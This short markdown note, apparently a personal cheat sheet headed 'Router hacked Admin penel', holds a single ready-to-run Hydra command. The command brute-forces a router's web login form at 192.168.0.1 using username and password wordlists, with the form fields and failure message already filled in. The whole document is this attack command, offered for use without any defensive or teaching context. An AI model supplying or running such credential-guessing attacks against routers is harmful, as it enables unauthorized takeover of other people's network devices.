# hydra

## Router hacked Admin penel

hydra 192.168.0.1 http-post-form "/login.htm:username=^USER^&password=^PASS^&Login=submit:The password is incorrect, please try again." -L user.txt -P user.txt -f -V -t 2
